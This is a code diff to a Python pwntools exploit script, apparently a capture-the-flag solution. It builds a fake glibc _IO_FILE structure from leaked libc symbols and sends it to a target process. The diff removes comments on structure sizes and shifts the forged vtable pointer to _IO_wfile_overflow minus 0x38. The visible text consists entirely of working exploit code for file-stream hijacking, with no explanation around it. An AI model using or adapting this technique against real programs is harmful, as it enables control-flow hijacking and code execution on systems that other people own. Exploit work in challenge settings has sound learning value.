@@ -47,20 +47,14 @@ def main():
     IO_wfile_overflow = libc.symbols['_IO_wfile_overflow']
     log.info(f"IO_wfile_overflow: {hex(IO_wfile_overflow)}")
     _IO_2_1_stderr_ = libc.symbols['_IO_2_1_stderr_']
-    # _IO_wide_data size is 0x80
-    # _IO_jump_t size is 0xa0
-    # _IO_FILE size is 0xe0
-    
+
     trash = win + 0x4367
     # good luck pwning :)
     # gdb.attach(r, gdbscript)
     fake_file = p64(0xfbad2484) + p64(0) *12 
     fake_file += p64(_IO_2_1_stderr_)  + p64(3)
     fake_file += p64(0) * 2 + p64(trash) + p64(0) * 9
-    fake_file += p64(IO_wfile_overflow)
-    
-    # fake__IO_wide_data = 
-    
+    fake_file += p64(IO_wfile_overflow-0x38)    
     
     r.sendline(fake_file)
     r.sendlineafter(b'Reading over file pointer\n', fake_file)
